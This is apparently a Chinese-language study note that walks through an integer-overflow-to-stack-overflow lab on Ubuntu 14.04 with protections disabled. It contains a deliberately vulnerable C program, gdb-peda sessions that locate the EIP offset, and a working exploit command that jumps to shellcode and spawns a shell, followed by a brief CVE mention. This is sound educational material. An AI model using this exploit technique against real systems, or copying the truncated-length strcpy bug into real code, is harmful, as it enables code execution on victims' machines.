 0x00 beginning

依然是在 Ubuntu14.04 上面关闭安全保护机制, 实验代码取自 [^origin], 更多信息 [^phrack].

>什么是整数溢出?

存储的值超过类型系统最大的表示范围叫`interger overflow`, 小于其最小表示范围叫`interger underflow`, 整数溢出一般不会直接导致任意代码执行, 但是会导致栈或者堆溢出间接引发任意代码执行, 本笔记打算`interger overflow`导致`stack overflow`来说明问题.

>类型系统与其的表示范围?

当我们存储值到变量里面, 这个在类型语言里面 (c, c++, python, haskell...) 这个变量表示是有范围限制的, 比如当我们打算存 2147483648 到`signed int`类型变量里面, 在 32 位系统上面其表示最大值是`2^31-1`存储这样的值就会导致`integer overflow`,`unsigned int`类型其表示范围是`2^32-1`到`0`, 当存储值小于最小表示下届时候, 发生`integer underflow`.

存在问题示例代码:

```c

/* filename: vuln.c
 * gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void store_passwd_indb(char* passwd) {
}

void validate_uname(char* uname) {
}

void validate_passwd(char* passwd) {
 char passwd_buf[11];
 unsigned char passwd_len = strlen(passwd); /* [1] */ 
 if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
  printf("Valid Password\n"); /* [3] */ 
  fflush(stdout);
  strcpy(passwd_buf,passwd); /* [4] */
 } else {
  printf("Invalid Password\n"); /* [5] */
  fflush(stdout);
 }
 store_passwd_indb(passwd_buf); /* [6] */
}

int main(int argc, char* argv[]) {
 if(argc!=3) {
  printf("Usage Error:   \n");
  fflush(stdout);
  exit(-1);
 }
 validate_uname(argv[1]);
 validate_passwd(argv[2]);
 return 0;
}

```

标号 [1] 处显示了一个`integer overflow`,`strlen()`返回值类型是 size_t (ubuntu 下面定义为 unsigned int), 但是例子代码处用来存储的是个`char`,`char`是 8bit 显然是不能存储超过`2^8-1`, 超出表示的部分虽然会被截断 (虽然 strlen() 能正确找出, 长度 eax 寄存器也能保存, 但是放到`password_len`变量过程中导致问题), 但是如果我们把第二个参数控制在 255+5 到 255+8 之间这样就能 bypass 下面的 if 检查, 这样可以导致基于栈的缓冲区溢出!

# 0x10 analysis

分析密码验证, 输入 256 就已经超越了 char 的表示范围, 可以看下面分析过程观察两次输入的`eax 寄存器`, 但这个程度只能算是一个小 bug.

```shell
gdb-peda$ r Sn0rt $(python -c 'print "A" * 256')
gdb-peda$ b validate_passwd 
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
...
gdb-peda$ info registers al
al             0xff	0xff
...
gdb-peda$ b validate_passwd 
...
gdb-peda$ r Sn0rt $(python -c 'print "A" * 256')
...
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
...
gdb-peda$ info registers al
al             0x0	0x0
```

因为下面 cmp 检查了`strlen()`的返回值的长度所以:

```shell
[----------------------------------registers-----------------------------------]
EAX: 0x103 
...
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <validate_passwd+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048510 <validate_passwd+9>:	mov    DWORD PTR [esp],eax
   0x8048513 <validate_passwd+12>:	call   0x80483e0 <strlen@plt>
=> 0x8048518 <validate_passwd+17>:	mov    BYTE PTR [ebp-0x9],al
   0x804851b <validate_passwd+20>:	cmp    BYTE PTR [ebp-0x9],0x3
   0x804851f <validate_passwd+24>:	jbe    0x8048554 <validate_passwd+77>
   0x8048521 <validate_passwd+26>:	cmp    BYTE PTR [ebp-0x9],0x8
   0x8048525 <validate_passwd+30>:	ja     0x8048554 <validate_passwd+77>
[------------------------------------stack-------------------------------------]
```
这样是构造出绕过 if 检查的方式, 但是导致了 crash.

# 0x20 prepare

寻找一下哪里覆盖 eip.

```shell
gdb-peda$ pattern_arg 2 262
Set 2 arguments to program
gdb-peda$ r
...
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
...
EIP: 0x41414441 ('ADAA')
...
gdb-peda$ r AA $(python -c 'print "A" * 26 + "B" * 4 + "C" * (261-4-26)')
Starting program: /home/Sn0rt/lab/vuln AA $(python -c 'print "A" * 26 + "B" * 4 + "C" * (261-4-26)')
Valid Password

Program received signal SIGSEGV, Segmentation fault.
...
EIP: 0x42424141 ('AABB')
...
gdb-peda$ r AA $(python -c 'print "A" * 24 + "B" * 4 + "C" * (261-4-24)')
Starting program: /home/Sn0rt/lab/vuln AA $(python -c 'print "A" * 24 + "B" * 4 + "C" * (261-4-24)')
Valid Password

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xbffff584 ('A' <repeats 24 times>, "BBBB", 'C' <repeats 172 times>...)
EBX: 0xb7fcd000 --> 0x1a9da8 
ECX: 0xbffff8a0 ("CCCCCCC")
EDX: 0xbffff682 ("CCCCCCC")
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5a0 ('C' <repeats 200 times>...)
EIP: 0x42424242 ('BBBB')
```

大体上构造完成, 把 BBBB 写入 eip, 然后正式准备一下使用 ROP 技术, 构造一下 exp.

```shell
Sn0rt@warzone:~/lab$ export SHELLCODE=$(cat shellcode.bin)
Sn0rt@warzone:~/lab$ ./getaddr SHELLCODE ./vuln
SHELLCODE will be at 0xbffff848
Sn0rt@warzone:~/lab$ ./vuln AA $(python -c 'print "A" * 24 + "\x48\xf8\xff\xbf" + "C" * (261-4-24)')
Valid Password
sh-4.3$ id
uid=1042(Sn0rt) gid=1043(Sn0rt) groups=1043(Sn0rt)
sh-4.3$ 
```

初步利用完成!

# 0x40 reality

## 0x41 CVE-2012-0711

>Integer signedness error in the db2dasrrm process in the DB2 Administration Server (DAS) in IBM DB2 9.1 through FP11, 9.5 before FP9, and 9.7 through FP5 on UNIX platforms allows remote attackers to execute arbitrary code via a crafted request that triggers a heap-based buffer overflow. 

这个 CVE 是`Integer Signedness`导致堆溢出后发生任意代码执行, 待我学习到 heap 部分时候, 尝试来分析一下这个漏洞.

### reference

[^phrack]: [Phrack 0x0b, Issue 0x3c, Phile #0x0a of 0x10](http://phrack.org/issues/60/10.html)
[^origin]: [sploitfun](https://sploitfun.wordpress.com/2015/06/23/integer-overflow/)
